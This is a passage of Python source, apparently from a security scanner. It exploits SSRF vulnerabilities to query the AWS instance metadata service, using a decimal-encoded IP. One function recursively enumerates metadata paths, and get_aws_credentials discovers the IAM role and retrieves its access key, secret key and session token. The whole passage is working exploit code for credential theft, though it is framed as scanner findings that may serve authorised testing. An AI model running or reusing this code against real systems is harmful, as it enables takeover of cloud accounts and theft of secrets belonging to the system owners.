    endpoint, param = _resolve_ssrf_sink(scanner, ssrf_endpoint, ssrf_param)
    if not endpoint:
        return {}
    ip = metadata_ip or ip_to_decimal(AWS_METADATA_IP)
    results: dict[str, str] = {}

    def fetch(path: str) -> str | None:
        r = _ssrf_fetch(scanner, endpoint, param, f"http://{ip}{path}", url_suffix=url_suffix)
        if _ssrf_blocked(r.text):
            return None
        content = _ssrf_body(r.text)
        return None if ("Not Found" in content or "Could not fetch" in content) else content

    def _explore(path: str, depth: int) -> None:
        if depth > max_depth:
            return
        content = fetch(path)
        if content is None:
            return
        lines = [line.strip() for line in content.split("\n") if line.strip()]
        if len(lines) > 1 and all(not ln.startswith(("{", "<")) for ln in lines):
            for line in lines:
                if line.endswith("/"):
                    _explore(f"{path}{line}", depth + 1)
                else:
                    leaf = fetch(f"{path}{line}")
                    if leaf is not None:
                        results[f"{path}{line}"] = leaf
        else:
            results[path.rstrip("/")] = content

    _explore(base_path, 0)

    if results:
        scanner._record_finding(
            endpoint=endpoint,
            method="POST",
            payload=f"http://{ip}{base_path}{url_suffix}",
            indicators=["ssrf", "aws_metadata"],
            details=[f"Enumerated {len(results)} metadata node(s) via SSRF"],
            vuln_type="ssrf_aws_metadata",
            source="enumerate_aws_metadata",
        )
    return results


def get_aws_credentials(
    scanner: SecurityScanner,
    *,
    ssrf_endpoint: str | None = None,
    ssrf_param: str | None = None,
    url_suffix: str = "",
    metadata_ip: str | None = None,
    role_name: str | None = None,
) -> dict[str, str] | None:
    """Get AWS IAM credentials from the metadata service via an SSRF sink.

    The sink is discovered (or passed in). If ``role_name`` is omitted, the
    available role is discovered from the metadata service first. Returns a dict
    with AccessKeyId, SecretAccessKey, Token, Expiration.
    """
    endpoint, param = _resolve_ssrf_sink(scanner, ssrf_endpoint, ssrf_param)
    if not endpoint:
        return None
    ip = metadata_ip or ip_to_decimal(AWS_METADATA_IP)
    cred_base = f"http://{ip}/latest/meta-data/iam/security-credentials/"

    if role_name is None:
        r = _ssrf_fetch(scanner, endpoint, param, cred_base, url_suffix=url_suffix)
        if _ssrf_blocked(r.text):
            return None
        content = _ssrf_body(r.text)
        roles = [ln.strip() for ln in content.split("\n") if ln.strip() and "Not Found" not in ln]
        if not roles:
            return None
        role_name = roles[0]

    target = f"{cred_base}{role_name}"
    r = _ssrf_fetch(scanner, endpoint, param, target, url_suffix=url_suffix)
    if _ssrf_blocked(r.text):
        return None
    content = _ssrf_body(r.text)
    try:
        creds: dict[str, str] = json.loads(content)
    except (json.JSONDecodeError, ValueError):
        return None

    if creds.get("AccessKeyId"):
        scanner._record_finding(
            endpoint=endpoint,
            method="POST",
            payload=target + url_suffix,
            indicators=["ssrf", "aws_credentials"],
            details=[f"IAM role {role_name}: AccessKeyId {creds.get('AccessKeyId')}"],
            vuln_type="ssrf_aws_credentials",
            source="get_aws_credentials",
        )
    return creds
